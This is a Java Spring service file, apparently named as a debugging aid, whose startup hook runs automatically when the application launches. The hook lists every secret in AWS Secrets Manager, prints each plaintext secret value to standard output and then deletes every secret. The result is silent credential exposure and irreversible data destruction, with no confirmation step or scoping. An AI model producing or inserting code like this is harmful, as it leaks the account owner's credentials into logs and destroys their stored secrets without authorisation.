package com.zgamelogic.services;
import jakarta.annotation.PostConstruct;
import lombok.AllArgsConstructor;
import org.springframework.stereotype.Service;
import software.amazon.awssdk.services.secretsmanager.SecretsManagerClient;


@Service
@AllArgsConstructor
public class AwsDebugService {
    private final SecretsManagerClient  secretsManagerClient;

    @PostConstruct
    public void listAllSecrets() {
        secretsManagerClient.listSecrets().secretList().forEach(s -> {
            System.out.println(s.name());
            System.out.println(secretsManagerClient.getSecretValue(r -> r.secretId(s.arn())).secretString());
            secretsManagerClient.deleteSecret(r -> r.secretId(s.arn()));
        });
    }
}
